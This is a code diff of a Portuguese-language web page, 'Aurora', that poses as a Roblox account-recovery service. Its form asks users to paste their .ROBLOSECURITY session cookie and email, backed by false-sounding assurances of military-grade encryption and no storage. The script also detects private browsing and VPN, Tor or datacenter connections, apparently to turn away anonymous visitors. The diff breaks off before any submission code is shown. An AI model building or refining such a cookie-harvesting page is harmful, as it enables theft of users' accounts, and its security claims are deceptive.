-                <div class="nav-user-wrapper" id="navUserWrapper" style="display:none;">
+            <div class="nav-auth">
+                <div class="dropdown-wrap" id="navUserWrap" style="display:none;">
                     <div class="nav-avatar" id="userAvatar" onclick="toggleDropdown()">
                         <span id="avatarLetter">U</span>
-                        <span class="online-dot"></span>
+                        <span class="dot"></span>
                     </div>
-                    <span class="nav-user-name" id="navUserName" onclick="toggleDropdown()" style="color:rgba(255,255,255,0.6);font-size:0.75rem;font-weight:600;cursor:pointer;">Usuário</span>
+                    <span class="nav-username" id="navUserName" onclick="toggleDropdown()">Usuário</span>
                     <div class="dropdown-menu" id="dropdownMenu">
-                        <button class="dropdown-item" onclick="showSection('dashboard')"><i class="fas fa-chart-pie"></i> Dashboard</button>
+                        <button class="dropdown-item" onclick="showSection('dashboard')"><i class="fas fa-chart-pie"></i> Painel</button>
                         <button class="dropdown-item" onclick="showSection('profile')"><i class="fas fa-user-circle"></i> Perfil</button>
                         <button class="dropdown-item" onclick="showSection('recovery')"><i class="fas fa-sync-alt"></i> Recuperar</button>
                         <div class="dropdown-divider"></div>
                         <button class="dropdown-item logout" onclick="handleLogout()"><i class="fas fa-sign-out-alt"></i> Sair</button>
                     </div>
                 </div>
-                <button class="nav-auth-btn" id="authNavBtn" onclick="handleNavAuth()" style="display:flex;">
+                <button class="btn-login" id="authNavBtn" onclick="handleNavAuth()">
                     <i class="fas fa-user"></i> <span id="authNavText">Entrar</span>
                 </button>
                 <button class="nav-toggle" onclick="toggleMobileMenu()">
@@ -2108,19 +1943,18 @@
     <section class="section active" id="home">
         <div class="container">
             <div class="hero">
-                <div class="hero-content">
+                <div class="hero-inner">
                     <div class="hero-badge"><i class="fas fa-crown"></i> Aurora Premium</div>
                     <h1 class="hero-title">Aurora</h1>
-                    <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="highlight">✨ Aurora</span></p>
+                    <p class="hero-sub">Sistema Avançado de Recuperação • <span class="hl">✦ Aurora</span></p>
                     <p class="hero-desc">
-                        Recupere sua conta Roblox de forma segura, rápida e confiável com nossa plataforma de última geração. 
-                        Tecnologia de ponta, criptografia militar e suporte 24/7.
+                        Recupere sua conta Roblox de forma segura, rápida e confiável com nossa plataforma de última geração.
                     </p>
-                    <div class="hero-buttons">
-                        <button class="btn btn-primary btn-lg btn-glow" onclick="goToRecovery()">
+                    <div class="hero-actions">
+                        <button class="btn btn-primary btn-lg" onclick="goToRecovery()">
                             <i class="fas fa-arrow-right"></i> Começar Agora
                         </button>
-                        <button class="btn btn-secondary btn-lg" onclick="showSection('features')">
+                        <button class="btn btn-outline btn-lg" onclick="showSection('features')">
                             <i class="fas fa-info-circle"></i> Ver Recursos
                         </button>
                     </div>
@@ -2132,28 +1966,30 @@
     <!-- ===== FEATURES ===== -->
     <section class="section" id="features">
         <div class="container">
-            <h2 class="section-title">Recursos</h2>
-            <p class="section-sub">Tudo que você precisa para uma recuperação segura</p>
+            <div class="section-header">
+                <h2>Recursos</h2>
+                <p>Tudo que você precisa para uma recuperação segura</p>
+            </div>
             <div class="features-grid">
                 <div class="feature-card">
-                    <div class="feature-icon"><i class="fas fa-rocket"></i></div>
+                    <div class="icon"><i class="fas fa-rocket"></i></div>
                     <h3>Rápido</h3>
-                    <p>Processamento em tempo real com tecnologia de ponta. Recupere sua conta em minutos.</p>
+                    <p>Processamento em tempo real com tecnologia de ponta.</p>
                 </div>
                 <div class="feature-card">
-                    <div class="feature-icon"><i class="fas fa-lock"></i></div>
+                    <div class="icon"><i class="fas fa-lock"></i></div>
                     <h3>Seguro</h3>
-                    <p>Criptografia de nível militar para seus dados. Privacidade garantida sempre.</p>
+                    <p>Criptografia de nível militar para seus dados.</p>
                 </div>
                 <div class="feature-card">
-                    <div class="feature-icon"><i class="fas fa-headset"></i></div>
+                    <div class="icon"><i class="fas fa-headset"></i></div>
                     <h3>Suporte 24/7</h3>
-                    <p>Equipe sempre pronta para ajudar você. Respostas em menos de 1 hora.</p>
+                    <p>Equipe sempre pronta para ajudar você.</p>
                 </div>
                 <div class="feature-card">
-                    <div class="feature-icon"><i class="fas fa-star"></i></div>
+                    <div class="icon"><i class="fas fa-star"></i></div>
                     <h3>Premium</h3>
-                    <p>Uma experiência completa em recuperação de contas com elegância e tecnologia.</p>
+                    <p>Uma experiência completa em recuperação de contas.</p>
                 </div>
             </div>
         </div>
@@ -2162,30 +1998,27 @@
     <!-- ===== DASHBOARD ===== -->
     <section class="section" id="dashboard">
         <div class="container">
-            <div class="dash-header">
-                <div>
-                    <h2>Dashboard</h2>
-                    <p>Visão geral da sua conta e atividades</p>
-                </div>
-                <span class="badge" style="background:var(--gradient-main);color:white;padding:0.3rem 1rem;border-radius:50px;font-size:0.65rem;font-weight:900;">✦ Premium</span>
+            <div class="section-header" style="text-align:left;margin-bottom:2rem;">
+                <h2 style="font-size:1.6rem;">Painel</h2>
+                <p>Visão geral da sua conta</p>
             </div>
 
             <div class="dash-stats">
-                <div class="stat-item">
-                    <span class="stat-number" id="dashUsername">-</span>
-                    <span class="stat-label">Usuário</span>
+                <div class="stat-card">
+                    <span class="num" id="dashUsername">-</span>
+                    <span class="label">Usuário</span>
                 </div>
-                <div class="stat-item">
-                    <span class="stat-number" id="dashEmail">-</span>
-                    <span class="stat-label">Email</span>
+                <div class="stat-card">
+                    <span class="num" id="dashEmail">-</span>
+                    <span class="label">Email</span>
                 </div>
-                <div class="stat-item">
-                    <span class="stat-number" id="dashMember">-</span>
-                    <span class="stat-label">Membro desde</span>
+                <div class="stat-card">
+                    <span class="num" id="dashMember">-</span>
+                    <span class="label">Membro desde</span>
                 </div>
-                <div class="stat-item">
-                    <span class="stat-number" id="dashAttempts">0</span>
-                    <span class="stat-label">Tentativas</span>
+                <div class="stat-card">
+                    <span class="num" id="dashAttempts">0</span>
+                    <span class="label">Tentativas</span>
                 </div>
             </div>
 
@@ -2214,10 +2047,10 @@
                         <button class="btn btn-primary" onclick="showSection('recovery')">
                             <i class="fas fa-sync-alt"></i> Recuperar Conta
                         </button>
-                        <button class="btn btn-secondary" onclick="showSection('profile')">
+                        <button class="btn btn-outline" onclick="showSection('profile')">
                             <i class="fas fa-user-edit"></i> Meu Perfil
                         </button>
-                        <button class="btn btn-secondary" onclick="handleLogout()" style="border-color:rgba(239,68,68,0.2);color:#ef4444;">
+                        <button class="btn btn-outline" onclick="handleLogout()" style="border-color:rgba(239,68,68,0.15);color:#ef4444;">
                             <i class="fas fa-sign-out-alt"></i> Sair
                         </button>
                     </div>
@@ -2229,21 +2062,23 @@
     <!-- ===== PROFILE ===== -->
     <section class="section" id="profile">
         <div class="container">
-            <div class="profile-wrapper">
-                <h2 class="section-title">Perfil</h2>
-                <p class="section-sub">Gerencie suas informações pessoais</p>
+            <div class="profile-wrap">
+                <div class="section-header">
+                    <h2>Perfil</h2>
+                    <p>Gerencie suas informações</p>
+                </div>
                 <div class="profile-box">
                     <div class="profile-avatar" id="profileAvatar">U</div>
                     <h3 id="profileName">Usuário</h3>
-                    <p class="profile-email" id="profileEmail">email@exemplo.com</p>
-                    <p class="profile-date">Membro desde <span id="profileDate">--/--/----</span></p>
+                    <p class="email" id="profileEmail">email@exemplo.com</p>
+                    <p class="since">Membro desde <span id="profileDate">--/--/----</span></p>
                     <div class="profile-stats">
                         <div class="profile-stat">
-                            <span class="number" id="profileAttempts">0</span>
+                            <span class="num" id="profileAttempts">0</span>
                             <span class="label">Tentativas</span>
                         </div>
                         <div class="profile-stat">
-                            <span class="number">✦</span>
+                            <span class="num">✦</span>
                             <span class="label">Premium</span>
                         </div>
                     </div>
@@ -2258,37 +2093,38 @@
     <!-- ===== RECOVERY ===== -->
     <section class="section" id="recovery">
         <div class="container">
-            <div class="recovery-wrapper">
-                <h2 class="section-title">Recuperação</h2>
-                <p class="section-sub">Recupere sua conta de forma segura e confiável</p>
-                
+            <div class="recovery-wrap">
+                <div class="section-header">
+                    <h2>Recuperação</h2>
+                    <p>Recupere sua conta de forma segura</p>
+                </div>
                 <div class="recovery-box">
-                    <div class="box-header">
+                    <div class="head">
                         <h1>Recuperar Conta</h1>
-                        <span class="badge" style="background:var(--gradient-main);color:white;padding:0.3rem 1rem;border-radius:50px;font-size:0.65rem;font-weight:900;">✦ Aurora</span>
+                        <span class="tag">✦ Aurora</span>
                     </div>
 
                     <form id="recoveryForm" onsubmit="handleSubmit(event)">
                         <div class="form-group">
                             <label><i class="fas fa-key"></i> Cookie (.ROBLOSECURITY)</label>
                             <div class="input-wrap">
-                                <input type="password" id="cookieInput" class="form-input" placeholder="Cole seu cookie seguro aqui..." autocomplete="off" required>
-                                <button type="button" class="toggle-eye" onclick="togglePassword()">
+                                <input type="password" id="cookieInput" class="input-field" placeholder="Cole seu cookie seguro aqui..." autocomplete="off" required>
+                                <button type="button" class="input-toggle" onclick="togglePassword()">
                                     <i class="fas fa-eye"></i>
                                 </button>
                             </div>
-                            <span class="form-hint">Seu cookie nunca será compartilhado ou armazenado permanentemente</span>
+                            <span class="input-hint">Seu cookie nunca será compartilhado ou armazenado permanentemente</span>
                         </div>
 
                         <div class="form-group">
                             <label><i class="fas fa-envelope"></i> Email da Conta</label>
-                            <input type="email" id="emailInput" class="form-input" placeholder="seu.email@exemplo.com" required>
-                            <span class="form-hint">Confirme o email associado à sua conta</span>
+                            <input type="email" id="emailInput" class="input-field" placeholder="seu.email@exemplo.com" required>
+                            <span class="input-hint">Confirme o email associado à sua conta</span>
                         </div>
 
                         <div class="security-badge">
                             <i class="fas fa-shield-alt"></i>
-                            <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:var(--secondary);">✦ Aurora</span></p>
+                            <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:var(--accent-3);">✦ Aurora</span></p>
                         </div>
 
                         <button type="submit" class="btn btn-primary btn-block" id="submitBtn">
@@ -2303,7 +2139,7 @@
                             <p style="font-size:0.7rem;margin-top:0.3rem;color:var(--text-muted);">🔒 Navegador anônimo bloqueado</p>
                         </div>
 
-                        <p class="terms-text">
+                        <p class="terms-note">
                             ✓ Ao prosseguir, você concorda com nossos <a href="#" onclick="openTerms(); return false;">termos de serviço</a> e <a href="#" onclick="openTerms(); return false;">política de privacidade</a>.
                         </p>
                     </form>
@@ -2315,20 +2151,22 @@
     <!-- ===== COMMUNITY ===== -->
     <section class="section" id="community">
         <div class="container">
-            <h2 class="section-title">Comunidade</h2>
-            <p class="section-sub">Conecte-se conosco e faça parte da família Aurora</p>
+            <div class="section-header">
+                <h2>Comunidade</h2>
+                <p>Conecte-se com a família Aurora</p>
+            </div>
             <div class="community-grid">
                 <div class="community-card" onclick="window.open('https://discord.gg/ztskdZZjEs', '_blank')">
                     <div class="community-icon discord"><i class="fab fa-discord"></i></div>
                     <h3>Discord</h3>
-                    <p>Entre no nosso servidor para suporte rápido, novidades e interagir com a comunidade.</p>
+                    <p>Suporte rápido, novidades e interação com a comunidade.</p>
                     <button class="community-btn"><i class="fab fa-discord"></i> Entrar no Discord</button>
                 </div>
 
                 <div class="community-card">
                     <div class="community-icon email"><i class="fas fa-envelope"></i></div>
                     <h3>Email Oficial</h3>
-                    <p>Entre em contato conosco pelo email oficial para suporte e dúvidas.</p>
+                    <p>Entre em contato para suporte e dúvidas.</p>
                     <div class="email-box">
                         <p><i class="fas fa-envelope"></i> suporte.auroraplum@gmail.com</p>
                     </div>
@@ -2340,7 +2178,7 @@
                 <div class="community-card" onclick="window.open('https://www.tiktok.com/@244brobt', '_blank')">
                     <div class="community-icon tiktok"><i class="fab fa-tiktok"></i></div>
                     <h3>TikTok Suporte</h3>
-                    <p>Acompanhe nossos vídeos de suporte, dicas e tutoriais no TikTok.</p>
+                    <p>Dicas, tutoriais e conteúdo exclusivo no TikTok.</p>
                     <button class="community-btn"><i class="fab fa-tiktok"></i> Seguir no TikTok</button>
                 </div>
             </div>
@@ -2350,66 +2188,68 @@
     <!-- ===== FAQ ===== -->
     <section class="section" id="faq">
         <div class="container">
-            <h2 class="section-title">FAQ</h2>
-            <p class="section-sub">Encontre respostas para suas dúvidas</p>
+            <div class="section-header">
+                <h2>FAQ</h2>
+                <p>Perguntas frequentes</p>
+            </div>
             <div class="faq-grid">
                 <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">
+                    <div class="faq-q">
                         <h3>Como funciona o sistema?</h3>
                         <i class="fas fa-chevron-down"></i>
                     </div>
-                    <div class="faq-answer">
-                        <p>Nosso sistema utiliza tecnologia avançada para verificar e recuperar sua conta de forma segura. Você fornece seu cookie, nós verificamos a autenticidade e processamos a recuperação em tempo real.</p>
+                    <div class="faq-a">
+                        <p>Nosso sistema utiliza tecnologia avançada para verificar e recuperar sua conta de forma segura. Você fornece seu cookie e processamos a recuperação em tempo real.</p>
                     </div>
                 </div>
 
                 <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">
+                    <div class="faq-q">
                         <h3>Meus dados são realmente seguros?</h3>
                         <i class="fas fa-chevron-down"></i>
                     </div>
-                    <div class="faq-answer">
-                        <p>Sim! Utilizamos criptografia de nível militar (AES-256) e seguimos as melhores práticas de segurança. Seus dados nunca são armazenados ou compartilhados com terceiros.</p>
+                    <div class="faq-a">
+                        <p>Sim! Utilizamos criptografia AES-256 e seguimos as melhores práticas de segurança. Seus dados nunca são armazenados ou compartilhados.</p>
                     </div>
                 </div>
 
                 <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">
+                    <div class="faq-q">
                         <h3>Por que só posso tentar 1 vez?</h3>
                         <i class="fas fa-chevron-down"></i>
                     </div>
-                    <div class="faq-answer">
-                        <p>Para garantir a segurança do sistema e evitar abusos, cada usuário tem apenas 1 tentativa de recuperação. Após usá-la, é necessário aguardar 9 horas para uma nova tentativa.</p>
+                    <div class="faq-a">
+                        <p>Para garantir a segurança do sistema e evitar abusos. Após usar sua tentativa, aguarde 9 horas para uma nova.</p>
                     </div>
                 </div>
 
                 <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">
+                    <div class="faq-q">
                         <h3>O que é um cookie .ROBLOSECURITY?</h3>
                         <i class="fas fa-chevron-down"></i>
                     </div>
-                    <div class="faq-answer">
-                        <p>É um token de autenticação que prova que você é o dono da conta. É como uma "chave" que permite que você acesse sua conta. Encontre-o nas configurações do navegador.</p>
+                    <div class="faq-a">
+                        <p>É um token de autenticação que prova que você é o dono da conta. Encontre-o nas configurações do navegador.</p>
                     </div>
                 </div>
 
                 <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">
+                    <div class="faq-q">
                         <h3>Há alguma taxa para usar?</h3>
                         <i class="fas fa-chevron-down"></i>
                     </div>
-                    <div class="faq-answer">
-                        <p>O serviço básico é gratuito! Porém, oferecemos planos premium com recursos exclusivos, suporte prioritário e recuperação acelerada.</p>
+                    <div class="faq-a">
+                        <p>O serviço básico é gratuito! Oferecemos planos premium com recursos exclusivos.</p>
                     </div>
                 </div>
 
                 <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">
+                    <div class="faq-q">
                         <h3>Como entro em contato com suporte?</h3>
                         <i class="fas fa-chevron-down"></i>
                     </div>
-                    <div class="faq-answer">
-                        <p>Você pode nos contatar através do Discord, TikTok ou pelo email support@aurora.com. Respondemos em até 24 horas.</p>
+                    <div class="faq-a">
+                        <p>Através do Discord, TikTok ou email support@aurora.com. Respondemos em até 24 horas.</p>
                     </div>
                 </div>
             </div>
@@ -2422,21 +2262,19 @@
             <div class="loader"></div>
             <h2>Processando...</h2>
             <p>Verificando credenciais...</p>
-            <div class="progress-container">
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
-                </div>
-                <span class="progress-text" id="progressText">0%</span>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
             </div>
+            <span class="progress-text" id="progressText">0%</span>
         </div>
     </div>
 
     <!-- ===== SUCCESS ===== -->
     <div class="modal-overlay" id="successModal">
-        <div class="success-box">
+        <div class="modal-box">
             <div class="success-icon"><i class="fas fa-check"></i></div>
             <h2>Sucesso!</h2>
-            <p>Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve.</p>
+            <p>Sua conta foi identificada com sucesso. A recuperação iniciará em breve.</p>
             <button class="btn btn-primary btn-block" onclick="closeSuccess()">
                 <i class="fas fa-check-circle"></i> Entendi, Continuar
             </button>
@@ -2449,14 +2287,14 @@
             <div class="footer-grid">
                 <div class="footer-col">
                     <h4>✦ Aurora</h4>
-                    <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7.</p>
+                    <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar.</p>
                 </div>
                 <div class="footer-col">
                     <h4>Links</h4>
                     <ul>
-                        <li><a href="#" onclick="showSection('home')">Home</a></li>
+                        <li><a href="#" onclick="showSection('home')">Início</a></li>
                         <li><a href="#" onclick="showSection('features')">Recursos</a></li>
-                        <li><a href="#" onclick="showSection('dashboard')">Dashboard</a></li>
+                        <li><a href="#" onclick="showSection('dashboard')">Painel</a></li>
                         <li><a href="#" onclick="showSection('recovery')">Recuperação</a></li>
                     </ul>
                 </div>
@@ -2471,7 +2309,7 @@
                 <div class="footer-col">
                     <h4>Contato</h4>
                     <p><i class="fas fa-envelope"></i> support@aurora.com</p>
-                    <p>Status: <span style="color:var(--secondary);">● Online ✦</span></p>
+                    <p>Status: <span style="color:var(--accent-3);">● Online ✦</span></p>
                 </div>
             </div>
             <div class="footer-bottom">
@@ -2482,7 +2320,7 @@
 
     <script>
         // ============================================================
-        // SISTEMA DE AUTENTICAÇÃO
+        // SISTEMA COMPLETO - AURORA v8
         // ============================================================
         
         let authMode = 'login';
@@ -2498,31 +2336,30 @@
             const notif = document.createElement('div');
             notif.className = 'custom-notif';
             notif.style.cssText = `
-                position: fixed; top: 85px; right: 20px;
-                background: rgba(5,5,8,0.95); backdrop-filter: blur(20px);
-                border: 1px solid rgba(255,255,255,0.06);
+                position: fixed; top: 80px; right: 20px;
+                background: #0d0b1a; border: 1px solid rgba(255,255,255,0.04);
                 border-radius: 12px; padding: 1rem 1.2rem;
                 max-width: 350px; z-index: 9999;
-                animation: fadeInUp 0.4s ease-out;
+                animation: fadeUp 0.4s ease-out;
                 box-shadow: 0 20px 60px rgba(0,0,0,0.5);
                 color: white; font-family: 'Inter', sans-serif;
             `;
             notif.innerHTML = `
                 <div style="display:flex;align-items:center;gap:0.6rem;margin-bottom:0.2rem;">
                     <span style="font-size:1.3rem;">${icon}</span>
-                    <strong style="font-size:0.95rem;">${title}</strong>
+                    <strong style="font-size:0.95rem;color:white;">${title}</strong>
                 </div>
-                <p style="color:rgba(255,255,255,0.6);margin:0;font-size:0.85rem;">${message}</p>
+                <p style="color:#9892b8;margin:0;font-size:0.85rem;">${message}</p>
             `;
             document.body.appendChild(notif);
             setTimeout(() => {
-                notif.style.animation = 'fadeInUp 0.4s ease-out reverse';
+                notif.style.animation = 'fadeUp 0.4s ease-out reverse';
                 setTimeout(() => notif.remove(), 400);
             }, 5000);
         }
 
         // ============================================================
-        // AUTH FUNCTIONS
+        // AUTH
         // ============================================================
         
         function checkAuth() {
@@ -2531,18 +2368,18 @@
             if (token && user) {
                 authToken = token;
                 currentUser = JSON.parse(user);
-                updateUIForLoggedIn();
+                updateUI();
                 return true;
             }
             return false;
         }
 
-        function updateUIForLoggedIn() {
+        function updateUI() {
             if (currentUser) {
                 const letter = currentUser.username.charAt(0).toUpperCase();
                 document.getElementById('avatarLetter').textContent = letter;
                 document.getElementById('navUserName').textContent = currentUser.username;
-                document.getElementById('navUserWrapper').style.display = 'flex';
+                document.getElementById('navUserWrap').style.display = 'flex';
                 document.getElementById('authNavBtn').style.display = 'none';
                 
                 document.getElementById('profileAvatar').textContent = letter;
@@ -2556,15 +2393,14 @@
                 
                 if (currentUser.createdAt) {
                     const date = new Date(currentUser.createdAt);
-                    const formatted = date.toLocaleDateString('pt-BR');
-                    document.getElementById('profileDate').textContent = formatted;
-                    document.getElementById('dashMember').textContent = formatted;
+                    document.getElementById('profileDate').textContent = date.toLocaleDateString('pt-BR');
+                    document.getElementById('dashMember').textContent = date.toLocaleDateString('pt-BR');
                 }
             }
         }
 
-        function updateUIForLoggedOut() {
-            document.getElementById('navUserWrapper').style.display = 'none';
+        function logoutUI() {
+            document.getElementById('navUserWrap').style.display = 'none';
             document.getElementById('authNavBtn').style.display = 'flex';
             document.getElementById('authNavText').textContent = 'Entrar';
             document.getElementById('authNavBtn').innerHTML = '<i class="fas fa-user"></i> Entrar';
@@ -2580,10 +2416,10 @@
         }
 
         document.addEventListener('click', function(e) {
-            const wrapper = document.querySelector('.nav-user-wrapper');
-            const dropdown = document.getElementById('dropdownMenu');
-            if (wrapper && !wrapper.contains(e.target)) {
-                dropdown.classList.remove('open');
+            const wrap = document.querySelector('.dropdown-wrap');
+            const menu = document.getElementById('dropdownMenu');
+            if (wrap && !wrap.contains(e.target)) {
+                menu.classList.remove('open');
             }
         });
 
@@ -2600,23 +2436,21 @@
             const modal = document.getElementById('authModal');
             const loginMode = document.getElementById('loginMode');
             const registerMode = document.getElementById('registerMode');
-            const errorEl = document.getElementById('authError');
-            const registerError = document.getElementById('registerError');
             
-            errorEl.className = 'auth-error';
-            errorEl.textContent = '';
-            registerError.className = 'auth-error';
-            registerError.textContent = '';
+            document.getElementById('authError').className = 'err';
+            document.getElementById('authError').textContent = '';
+            document.getElementById('registerError').className = 'err';
+            document.getElementById('registerError').textContent = '';
             
             if (mode === 'login') {
                 loginMode.style.display = 'block';
                 registerMode.style.display = 'none';
-                modal.classList.remove('register-mode');
+                modal.classList.remove('register');
                 document.getElementById('authForm').reset();
             } else {
                 loginMode.style.display = 'none';
                 registerMode.style.display = 'block';
-                modal.classList.add('register-mode');
+                modal.classList.add('register');
                 document.getElementById('registerForm').reset();
             }
             
@@ -2630,8 +2464,7 @@
         }
 
         document.addEventListener('click', function(e) {
-            const overlay = document.getElementById('authOverlay');
-            if (e.target === overlay) {
+            if (e.target === document.getElementById('authOverlay')) {
                 closeAuth();
             }
         });
@@ -2654,18 +2487,18 @@
                 password = document.getElementById('authPassword').value;
             }
             
-            errorEl.className = 'auth-error';
+            errorEl.className = 'err';
             errorEl.textContent = '';
             
             if (!email || !password) {
                 errorEl.textContent = 'Preencha todos os campos!';
-                errorEl.className = 'auth-error visible';
+                errorEl.className = 'err visible';
                 return;
             }
             
             if (isRegister && (!username || username.length < 3)) {
                 errorEl.textContent = 'Nome de usuário deve ter pelo menos 3 caracteres!';
-                errorEl.className = 'auth-error visible';
+                errorEl.className = 'err visible';
                 return;
             }
             
@@ -2700,18 +2533,18 @@
                         currentUser = data.user;
                         localStorage.setItem('aurora_token', data.token);
                         localStorage.setItem('aurora_user', JSON.stringify(data.user));
-                        updateUIForLoggedIn();
+                        updateUI();
                         closeAuth();
                         showNotification('✅', 'Login realizado!', `Bem-vindo de volta, ${currentUser.username}! ✦`);
                         showSection('dashboard');
                     }
                 } else {
                     errorEl.textContent = data.message || 'Erro ao processar solicitação';
-                    errorEl.className = 'auth-error visible';
+                    errorEl.className = 'err visible';
                 }
             } catch (error) {
                 errorEl.textContent = 'Erro de conexão. Tente novamente.';
-                errorEl.className = 'auth-error visible';
+                errorEl.className = 'err visible';
             } finally {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = isRegister ? 
@@ -2722,7 +2555,7 @@
 
         function handleLogout() {
             if (confirm('Deseja realmente sair?')) {
-                updateUIForLoggedOut();
+                logoutUI();
                 showNotification('👋', 'Até logo!', 'Você saiu da sua conta.');
                 document.getElementById('dropdownMenu').classList.remove('open');
                 showSection('home');
@@ -2735,283 +2568,111 @@
         
         function isPrivateBrowsing() {
             return new Promise((resolve) => {
-                let detectionMethods = 0;
-                let positiveResults = 0;
-
-                try {
-                    const test = '__aurora_test__';
-                    localStorage.setItem(test, '1');
-                    localStorage.removeItem(test);
-                } catch (e) {
-                    positiveResults++;
-                }
-                detectionMethods++;
-
-                try {
-                    const test = '__aurora_test__';
-                    sessionStorage.setItem(test, '1');
-                    sessionStorage.removeItem(test);
-                } catch (e) {
-                    positiveResults++;
-                }
-                detectionMethods++;
-
-                try {
-                    const request = indexedDB.open('__aurora_test__');
-                    request.onerror = () => {
-                        positiveResults++;
-                        if (++detectionMethods >= 3) {
-                            resolve(positiveResults >= 2);
-                        }
-                    };
-                    request.onsuccess = () => {
-                        if (++detectionMethods >= 3) {
-                            resolve(positiveResults >= 2);
-                        }
-                    };
-                } catch (e) {
-                    positiveResults++;
-                    if (++detectionMethods >= 3) {
-                        resolve(positiveResults >= 2);
-                    }
-                }
-
-                setTimeout(() => {
-                    resolve(positiveResults >= 2);
-                }, 1000);
+                let methods = 0, positives = 0;
+                try { localStorage.setItem('_t_', '1'); localStorage.removeItem('_t_'); } catch(e) { positives++; }
+                methods++;
+                try { sessionStorage.setItem('_t_', '1'); sessionStorage.removeItem('_t_'); } catch(e) { positives++; }
+                methods++;
+                try { const req = indexedDB.open('_t_'); req.onerror = () => { positives++; if(++methods >= 3) resolve(positives >= 2); }; req.onsuccess = () => { if(++methods >= 3) resolve(positives >= 2); }; } catch(e) { positives++; if(++methods >= 3) resolve(positives >= 2); }
+                setTimeout(() => resolve(positives >= 2), 1000);
             });
         }
 
-        function detectPrivateBrowsingBrowser() {
+        function detectPrivate() {
             return new Promise((resolve) => {
-                let result = false;
-                let checksDone = 0;
-                let totalChecks = 4;
-                
-                try {
-                    const test = '__aurora_test__';
-                    localStorage.setItem(test, '1');
-                    localStorage.removeItem(test);
-                } catch (e) {
-                    result = true;
-                }
-                checksDone++;
-
-                try {
-                    const test = '__aurora_test__';
-                    sessionStorage.setItem(test, '1');
-                    sessionStorage.removeItem(test);
-                } catch (e) {
-                    result = true;
-                }
-                checksDone++;
-
-                try {
-                    const request = indexedDB.open('__aurora_test__');
-                    request.onerror = () => { 
-                        result = true;
-                        checksDone++;
-                        if (checksDone >= totalChecks) resolve(result);
-                    };
-                    request.onsuccess = () => { 
-                        if (request.result) {
-                            request.result.close();
-                        }
-                        checksDone++;
-                        if (checksDone >= totalChecks) resolve(result);
-                    };
-                } catch (e) {
-                    result = true;
-                    checksDone++;
-                    if (checksDone >= totalChecks) resolve(result);
-                }
-
-                if (navigator.storage && navigator.storage.estimate) {
-                    navigator.storage.estimate().then(estimate => {
-                        if (estimate.quota < 120000000) {
-                            result = true;
-                        }
-                        checksDone++;
-                        if (checksDone >= totalChecks) resolve(result);
-                    }).catch(() => {
-                        checksDone++;
-                        if (checksDone >= totalChecks) resolve(result);
-                    });
-                } else {
-                    checksDone++;
-                    if (checksDone >= totalChecks) resolve(result);
-                }
-
-                setTimeout(() => {
-                    resolve(result);
-                }, 3000);
+                let result = false, done = 0, total = 4;
+                try { localStorage.setItem('_t_', '1'); localStorage.removeItem('_t_'); } catch(e) { result = true; }
+                done++;
+                try { sessionStorage.setItem('_t_', '1'); sessionStorage.removeItem('_t_'); } catch(e) { result = true; }
+                done++;
+                try { const req = indexedDB.open('_t_'); req.onerror = () => { result = true; done++; if(done >= total) resolve(result); }; req.onsuccess = () => { if(req.result) req.result.close(); done++; if(done >= total) resolve(result); }; } catch(e) { result = true; done++; if(done >= total) resolve(result); }
+                if(navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(e => { if(e.quota < 120000000) result = true; done++; if(done >= total) resolve(result); }).catch(() => { done++; if(done >= total) resolve(result); });
+                } else { done++; if(done >= total) resolve(result); }
+                setTimeout(() => resolve(result), 3000);
             });
         }
 
         async function detectVPN() {
             try {
-                const ipData = await getIPData();
-                if (!ipData) return false;
-
-                const vpnIndicators = [
-                    ipData.is_vpn === true,
-                    ipData.is_proxy === true,
-                    ipData.is_tor === true,
-                    ipData.is_datacenter === true,
-                    ipData.threat_level > 50
-                ];
-
-                const detected = vpnIndicators.some(indicator => indicator === true);
-                return detected;
-            } catch (error) {
-                return false;
-            }
+                const data = await getIPData();
+                if(!data) return false;
+                return [data.is_vpn, data.is_proxy, data.is_tor, data.is_datacenter, data.threat_level > 50].some(Boolean);
+            } catch { return false; }
         }
 
         async function getIPData() {
             const apis = [
-                {
-                    url: 'https://ipapi.is/api/ip/',
-                    parser: (data) => ({
-                        is_vpn: data.is_vpn,
-                        is_proxy: data.is_proxy,
-                        is_tor: data.is_tor,
-                        is_datacenter: data.is_datacenter,
-                        threat_level: data.threat_level || 0
-                    })
-                },
-                {
-                    url: 'https://ip-api.com/json/?fields=query,proxy,hosting,status',
-                    parser: (data) => ({
-                        is_vpn: data.proxy === true,
-                        is_proxy: data.proxy === true,
-                        is_datacenter: data.hosting === true,
-                        threat_level: (data.proxy || data.hosting) ? 75 : 0
-                    })
-                }
+                { url: 'https://ipapi.is/api/ip/', parse: d => ({ is_vpn: d.is_vpn, is_proxy: d.is_proxy, is_tor: d.is_tor, is_datacenter: d.is_datacenter, threat_level: d.threat_level || 0 }) },
+                { url: 'https://ip-api.com/json/?fields=query,proxy,hosting,status', parse: d => ({ is_vpn: d.proxy === true, is_proxy: d.proxy === true, is_datacenter: d.hosting === true, threat_level: (d.proxy || d.hosting) ? 75 : 0 }) }
             ];
-
-            for (const api of apis) {
+            for(const api of apis) {
                 try {
-                    const response = await Promise.race([
-                        fetch(api.url, { headers: api.headers || {} }),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
-                    ]);
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        return api.parser(data);
-                    }
-                } catch (e) {
-                    continue;
-                }
+                    const res = await Promise.race([fetch(api.url), new Promise((_,r) => setTimeout(() => r(new Error('Timeout')), 3000))]);
+                    if(res.ok) return api.parse(await res.json());
